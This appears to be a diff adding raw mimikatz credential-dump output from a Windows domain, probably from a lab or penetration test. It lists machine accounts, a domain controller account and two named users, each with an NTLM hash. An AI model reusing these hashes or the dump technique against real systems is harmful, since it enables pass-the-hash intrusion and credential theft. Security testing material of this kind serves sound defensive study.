+Object RDN           : DESKTOP-CLIENT2
+
+** SAM ACCOUNT **
+
+SAM Username         : DESKTOP-CLIENT2$
+User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-1103
+Object Relative ID   : 1103
+
+Credentials:
+  Hash NTLM: 6941613efeeea45975ea9c3741df932a
+
+Object RDN           : Florian FH. Hagengruber
+
+** SAM ACCOUNT **
+
+SAM Username         : f.hagengruber
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-1105
+Object Relative ID   : 1105
+
+Credentials:
+  Hash NTLM: 5a883a8773854d53c76d571749c9d3bd
+
+Object RDN           : Miriam MB. Bauer
+
+** SAM ACCOUNT **
+
+SAM Username         : m.bauer
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-1106
+Object Relative ID   : 1106
+
+Credentials:
+  Hash NTLM: 5a883a8773854d53c76d571749c9d3bd
+
+Object RDN           : WIN-CS7QONR86QP
+
+** SAM ACCOUNT **
+
+SAM Username         : WIN-CS7QONR86QP$
+User Account Control : 00082000 ( SERVER_TRUST_ACCOUNT TRUSTED_FOR_DELEGATION )
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-1000
+Object Relative ID   : 1000
+
+Credentials:
+  Hash NTLM: d2bcf82c91092b98d71cd9ab98e771d7
+
+mimikatz(commandline) # exit
+Bye!
